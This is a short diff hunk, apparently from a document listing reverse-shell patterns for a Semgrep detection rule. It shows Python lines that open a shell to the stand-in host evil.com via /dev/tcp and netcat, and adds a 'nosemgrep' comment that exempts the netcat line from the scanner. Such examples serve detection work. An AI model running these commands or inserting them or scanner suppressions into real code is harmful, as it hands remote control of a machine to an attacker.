@@ -44,6 +44,7 @@ subprocess.Popen(["/bin/sh"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.file
 ### Subprocess-Based
 ```python
 subprocess.Popen("bash -i >& /dev/tcp/evil.com/4444 0>&1", shell=True)
+# nosemgrep: skill-reverse-shell
 os.system("nc -e /bin/sh evil.com 4444")
 ```
 
